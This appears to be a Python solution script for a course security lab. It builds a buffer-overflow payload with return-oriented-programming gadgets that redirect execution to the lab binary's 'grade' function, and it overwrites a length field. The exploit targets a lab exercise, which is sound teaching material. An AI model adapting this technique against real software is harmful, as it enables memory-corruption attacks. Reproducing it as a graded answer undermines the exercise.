#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

pop_rdi = 0x4018a3
ret     = 0x4018a4
grade   = 0x401677

# 前 128 字节：会被 memcpy 搬到 rbp
payload = b"A" * 8
payload += pop_rdi.to_bytes(8, "little")
payload += (4).to_bytes(8, "little")
payload += ret.to_bytes(8, "little")
payload += grade.to_bytes(8, "little")
payload += b"A" * (128 - len(payload))

# 128..255
payload += b"A" * (0x100 - 128)

# 256..259：把 f.len 改成 0xa0
payload += (0xA0).to_bytes(4, "little")

sys.stdout.buffer.write(payload + b"\n")
